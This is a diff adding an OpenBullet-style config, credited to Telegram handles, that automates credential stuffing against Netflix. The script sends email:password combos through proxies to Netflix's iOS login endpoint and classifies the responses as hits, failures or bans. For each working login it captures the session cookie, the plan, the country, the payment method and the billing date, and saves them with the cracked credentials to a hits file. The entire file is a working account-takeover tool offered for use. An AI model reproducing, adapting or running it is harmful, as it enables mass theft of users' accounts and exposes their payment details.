@@ -1,0 +1,128 @@
+[SETTINGS]
+{
+  "Name": "Netflix.Com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-06T16:50:18.4607739+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Full Capture | Save Hits txt File | API IOS | CPM Rate: 20-500",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 15,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#RAND FUNCTION RandomString "?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "RAND" 
+
+#KIR FUNCTION URLEncode "NFAPPL-02-IPHONE7=2-<RAND>" -> VAR "KIR" 
+
+#ENC FUNCTION URLEncode "{\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"<USER>\",\"rememberMe\":\"true\",\"password\":\"<PASS>\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}" -> VAR "ENC" 
+
+#Lenght FUNCTION Length "appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn=<KIR>&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param=<ENC>&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" -> VAR "Lenght" 
+
+#Post REQUEST POST "https://ios.prod.ftl.netflix.com/iosui/user/11.44" 
+  CONTENT "appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn=<KIR>&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param=<ENC>&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: ios.prod.ftl.netflix.com" 
+  HEADER "X-Netflix.Argo.abTests: " 
+  HEADER "X-Netflix.client.appVersion: 11.44.0" 
+  HEADER "Accept: */*" 
+  HEADER "X-Netflix.Argo.NFNSM: 9" 
+  HEADER "Accept-Language: en-US;q=1, fa-UK;q=0.9, en-UK;q=0.8, ar-UK;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Netflix.Request.Attempt: 1" 
+  HEADER "X-Netflix.client.idiom: phone" 
+  HEADER "X-Netflix.Request.Routing: {\"path\":\"/nq/iosui/argo/~11.44.0/user\",\"control_tag\":\"iosui_argo_non_member\"}" 
+  HEADER "User-Agent: Argo/11.44.0 (iPhone; iOS 12.4.3; Scale/2.00)" 
+  HEADER "X-Netflix.client.type: argo" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "Connection: close" 
+  HEADER "X-Netflix.client.iosVersion: 12.4.3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"value\":\"incorrect_password\"}," 
+    KEY "unrecognized_email_consumption_only" 
+  KEYCHAIN Success OR 
+    KEY "memberHome" 
+  KEYCHAIN Ban OR 
+    KEY "login_error_consumption_only" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "throttling_failure" 
+
+#Cookie PARSE "<SOURCE>" LR "\"flwssn\":\"" "\"" -> VAR "Cookie" 
+
+#info REQUEST GET "https://www.netflix.com/YourAccount" 
+  
+  COOKIE "flwssn: <Cookie>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.netflix.com" 
+  HEADER "Referer: https://www.netflix.com/browse" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+
+#Sub PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" -> VAR "Sub" 
+
+#Plan FUNCTION Translate 
+  KEY "\\u03A4\\u03C5\\u03C0\\u03B9\\u03BA\\u03CC" VALUE "Basic" 
+  KEY "B\\u00E1sico" VALUE "Basic" 
+  KEY "u57FAu672C" VALUE "Basic" 
+  KEY "\\" VALUE "" 
+  KEY "Est\\u00E1ndar" VALUE "Standard" 
+  KEY "Bu00E1sico" VALUE "Basic" 
+  "<Sub>" -> CAP "Plan" 
+
+#Period_Of_Time PARSE "<SOURCE>" LR ",\"planDuration\":\"" "\",\"localizedPlanName" CreateEmpty=FALSE -> CAP "Period Of Time" 
+
+#Free_Trial PARSE "<SOURCE>" LR "\"isInFreeTrial\":" "," -> CAP "Trial" 
+
+#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" -> CAP "Country" 
+
+#DVD PARSE "<SOURCE>" LR "\"isDVD\":" "," -> CAP "DVD" 
+
+#HD PARSE "<SOURCE>" LR "\"hasHD\":" "," -> CAP "HD" 
+
+#Ultra_HD PARSE "<SOURCE>" LR "\"hasUHD\":" "," -> CAP "Ultra HD" 
+
+#Stream PARSE "<SOURCE>" LR "\"maxStreams\":" "," -> CAP "Stream" 
+
+#Billing PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" -> VAR "Billing" 
+
+#Nex_Billing FUNCTION Replace "\\x2F" "/" "<Billing>" -> CAP "Next Billing" 
+
+#Billing PARSE "<SOURCE>" LR "data-uia=\"payment-text\">" "</span" CreateEmpty=FALSE -> CAP "Payment Methode" 
+
+#CC FUNCTION Constant "@BruteForce" -> CAP " Telegram Channel: " 
+
+#SSS UTILITY File "Netflix Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail:  <USER>\\nPassword: <PASS>\\n<<<<<<<<<<<=Information=>>>>>>>>>>\\nPlan: <Plan>\\nPeriod Of Time: <Period Of Time>\\nCountry: <Country>\\nFree Trial: <Trial>\\nDVD: <DVD>\\nMax Streams: <Stream>\\nHas HD: <HD>\\nHas Ultra HD: <Ultra HD>\\nPayment Methode: <Payment Methode>\\nNext Billing Date: <Next Billing>\\n\\n<<<<<<=Credit=>>>>>>\\nConfiged By @TheOwn | Telegram Channel: T.me/BruteForce \\n=================================================" -> VAR "Save" 
+
